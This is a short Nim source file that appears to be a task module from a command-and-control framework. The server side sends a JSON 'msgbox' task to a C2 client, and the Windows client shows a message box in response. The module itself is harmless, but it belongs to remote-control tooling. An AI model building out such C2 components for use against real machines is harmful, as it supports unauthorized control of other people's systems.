when defined(server):
    import asyncdispatch, json
    import ../server/[types, communication]

when defined(client):
    import ../client/communication
    import net
    when defined(windows):
        import winim/[inc/lm, lean]

when defined(server):
    proc sendTask*(client: C2Client, title: string, caption: string) {.async.} =
        let j = %*
            {
                "task": "msgbox",
                "title": title,
                "caption": caption
            }
        await client.sendClientTask($j)

when defined(client):
    proc executeTask*(client: net.Socket, title: string, caption: string) =
        MessageBox(0, title, caption, 0)